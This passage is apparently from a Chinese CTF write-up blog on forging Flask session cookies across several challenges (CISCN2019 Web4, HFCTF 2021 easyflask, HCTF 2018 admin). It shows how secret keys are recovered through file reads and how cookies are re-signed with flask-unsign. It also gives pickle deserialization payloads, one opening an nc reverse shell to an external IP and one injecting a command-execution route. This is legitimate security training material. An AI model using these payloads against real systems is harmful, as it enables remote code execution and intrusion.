+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>:  <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>:  <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>:  <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>ABCMeta</code> 是一个元类，用来创建抽象类。在 Python 3.0-3.3 版本中，所有的抽象类都必须通过 <code>ABCMeta</code> 来创建，使用 <code>abstractmethod</code> 标记的方法必须在子类中实现。从 Python 3.4 开始，Python 直接引入了 <code>ABC</code> 类，作为所有抽象类的基类，不再需要通过 <code>ABCMeta</code> 作为元类来定义抽象类。</p>
+</blockquote>
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a><strong>demo1</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span>   <span class="comment">#设置为24位的字符,每次运行服务器都是不同的，所以服务器启动一次上次的session就清除。</span></span><br><span class="line">app.config[<span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>]=timedelta(days=<span class="number">7</span>) <span class="comment">#设置session的保存时间。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    session.permanent=<span class="literal">True</span>  <span class="comment">#默认session的时间持续31天</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;st4ck&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">    <span class="keyword">return</span>  session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;delete&#x27;</span></span><br><span class="line"><span class="comment">#清楚session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clear/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;clear&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先我们进页面拿到<code>session</code>之后，直接伪造就成功了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie &#x27;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Zxdmow.BzAFkrTH8uJ0vjX9NK84fs4fd_4&#x27;</span><br><span class="line">得到key为admin</span><br><span class="line"></span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot; --secret &#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>不过我在测试的时候发现了一个问题就是第一次伪造居然没有成功</p>
+<p><img src="/../images/achieve/202410/flask%E7%9A%84session%E4%BC%AA%E9%80%A0/QQ%E6%88%AA%E5%9B%BE20241022165221.png" alt="1"></p>
+<h3 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h3><p>进来发现可以任意文件读取，发现有session，读取一下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9c691607-93a5-4804-8bf3-0c970945b836.node5.buuoj.cn:81/read?url=/app/app.py</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        </span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里简单的看看发现这个key是<code>uuid.getnode()</code> 获取设备的 MAC 地址，并且基于它生成一个随机数种子，将其乘以 <code>233</code>，那么这里我们要先得到Linux的mac地址才可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://9c691607-93a5-4804-8bf3-0c970945b836.node5.buuoj.cn:81/read?url=/sys/class/net/eth0/address</span><br><span class="line"></span><br><span class="line">26:02:a0:70:24:ff</span><br></pre></td></tr></table></figure>
+
+<p>然后写个脚本转换成十进制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac=<span class="string">&quot;26:02:a0:70:24:ff&quot;</span></span><br><span class="line">nmac=mac.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">random.seed(<span class="built_in">int</span>(nmac,<span class="number">16</span>))</span><br><span class="line">key=<span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="comment"># 151.884456934</span></span><br></pre></td></tr></table></figure>
+
+<p>然后必须使用python2运行脚本，不然会key不对，因为容器的版本是python2，这里我没有所以下载了一会</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c &#x27;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.ZxdrSA.Ncr0UTHnOZMsHMD2ShMa4FqUq78&#x27; -s &#x27;151.884456934&#x27;</span><br><span class="line"></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s &#x27;151.884456934&#x27; -t &quot;&#123;&#x27;username&#x27;:&#x27;fuck&#x27;&#125;&quot;</span><br><span class="line">eyJ1c2VybmFtZSI6ImZ1Y2sifQ.Zxdvlg.yMn9uQGEEXQ0_1hrxkuEnKnLo88</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以了</p>
+<h3 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h3><p>首先进来然后读到源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个 User 类</span></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_handler</span>():</span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>发现是一个pickle反序列化，而且这个反序列化还比较特别</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie &#x27;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.Zxd0Ew.FE739mDkORjZKi8wUsoC_ihTmPU&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里解密之后可以看出是吧pickle的数据放到session里面，然后再访问<code>/admin</code>路由来进行RCE</p>
+<p>写个<code>poc</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc 110.42.47.145 9999 -e /bin/sh&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a=pickle.dumps(User())</span><br><span class="line">b=base64.b64encode(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment"># b&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDI3LjI1LjE1MS40OCA5OTk5IC1lIC9iaW4vc2gnKZSFlFKULg==&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们直接在<code>User</code>类里面加入<code>reduce</code>方法，现在还缺少key，读取文件看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://d79f09e0-eba8-4366-b99e-7a3f58f3488b.node5.buuoj.cn:81/file?file=/proc/self/environ</span><br><span class="line"></span><br><span class="line">glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure>
+
+<p>然后伪造cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDI3LjI1LjE1MS40OCA5OTk5IC1lIC9iaW4vc2gnKZSFlFKULg==&#x27;&#125;&quot; --secret &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span><br><span class="line"></span><br><span class="line">eyJ1IjoiZ0FTVlZ3QUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJdzdYMTlwYlhCdmNuUmZYeWduYjNNbktTNXplWE4wWlcwb0oyNWpJREV4TUM0ME1pNDBOeTR4TkRVZ09UazVPU0F0WlNBdlltbHVMM05vSnltVWhaUlNsQzQ9In0.Zxd4LQ.nb_BX_nxzya9tPD4hB_4rzVqSO8</span><br></pre></td></tr></table></figure>
+
+<p>但是并没有成功，后面发现参数不对</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw6X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDI3LjI1LjE1MS40OCA5OTk5IC1lIC9iaW4vc2gnKZSFlFKULg==&#x27;&#125;&#125;&quot; --secret &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span><br><span class="line"></span><br><span class="line">.eJwtxsEOgiAAANB_4QtAxU03D0baQM0tTBg3cEWRoy5Z6fz3OvRObwFPkC7AgBTYnPe9zf9IQ3YMafGGWuB5pK9CSXUxjHe_xxIlDyM30-APZ_mx3oSNrzieT3IPlYB3FmBHtzSsHUW1K1DDI9iSHLfdDVOCRkqSqxbRNATWV4qXY1kda5tlYF2_C_Etvg.Zxd8rQ.PttfeJwijgdIb2u0ggL-LrqGPR0</span><br></pre></td></tr></table></figure>
+
+<p>理论上我这里真的找不出错误来不过只要带着正确的payload就直接500了，弹不出来<code>shell</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&#x27;app.add_route(lambda request:__import__(&quot;os&quot;).popen(request.args.get(&quot;cmd&quot;)).read(), &quot;/shell&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(User())</span><br><span class="line">b=base64.b64encode(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;gASVkwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIx3YXBwLmFkZF9yb3V0ZShsYW1iZGEgcmVxdWVzdDpfX2ltcG9ydF9fKCJvcyIpLnBvcGVuKHJlcXVlc3QuYXJncy5nZXQoImNtZCIpKS5yZWFkKCksICIvc2hlbGwiLCBtZXRob2RzPVsiR0VUIiwgIlBPU1QiXSmUhZRSlC4=&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVkwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIx3YXBwLmFkZF9yb3V0ZShsYW1iZGEgcmVxdWVzdDpfX2ltcG9ydF9fKCJvcyIpLnBvcGVuKHJlcXVlc3QuYXJncy5nZXQoImNtZCIpKS5yZWFkKCksICIvc2hlbGwiLCBtZXRob2RzPVsiR0VUIiwgIlBPU1QiXSmUhZRSlC4=&#x27;&#125;&#125;&quot; --secret &#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span><br><span class="line"></span><br><span class="line">.eJwtwdtugyAAANB_4Qu8zAeb7KGyakG3VJmAvFVMlYjWxAti03_fy855gRWcXqAGJ9CeCe3N-R_8hgl272x37iw4NDIXwUVXY_Kr0e5XPDLZEPciDm3tU0eQbq6Yq0RyaeVA94bRo_maHtzTi0xC28ThI4V4kxZN2RhtMqFresVacqqln68Vx6O0wSh4_kTDzyIgmlISWMHiPoX9jCDapNfpOjEqg9EiePGsveK40VkVDi2RMi3S0a10c8XJUHaiIBp-fIL3-w9Gu0yK.Zxd-VA.hF90jV5bi9v_kg2bzjDkz5Bo3bE</span><br></pre></td></tr></table></figure>
+
+<p>这个还是没有用，不懂了</p>
+<h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这里的话是一道老相思了，一个审计的flask题目，经过审计得到key为<code>ckj123</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --decode --cookie &#x27;.eJxFUMtuwjAQ_JVqzxyKEx-KxIHKEIG0jkxtIu8F8QghDgYpgAJG_HtdKrXXmdl57AOWu7Y872Fwaa9lD5b1FgYPeFvDADCMGYmJRz1i1s8O5KqO_KJGb-95NqlJjzgGc0OHXGbjm9RVlwsbyDWpZLMDum1j_dxhwD4KwyhDjgxTcoaTUD96bp1s0FVJXpgk1-aOBaZSz10uPve2GCckLLdBdaQVz0XM8OSkHqUyYlJPE3KzeK-G8OzB5tzulpdTUx7_JzAVozd3KlRK2cKjoIYK01ltOultrD6vMdg-xpo2TBlqk0g1fNnVflWVf05f_sNsul_muPKRgPXqFE7HqquhB9dz2b5-B_13eH4D3_9ulw.Zxdw0g.ctfAsW_RL46CliW21lMecJxokiY&#x27;</span><br><span class="line"></span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;316d1f106bbef80feb2f28abe093512394a1580863f987be27dbdc335056dc93c8f59d41589b3d2879e79521c854c80aaa7d69c40e498116fc508740527f2d24&#x27;, &#x27;csrf_token&#x27;: b&#x27;3d5072ed8def06dee0a506f124b3652dcc261575&#x27;, &#x27;image&#x27;: b&#x27;JoTs&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot; --secret &#x27;ckj123&#x27;</span><br><span class="line">得到cookie</span><br><span 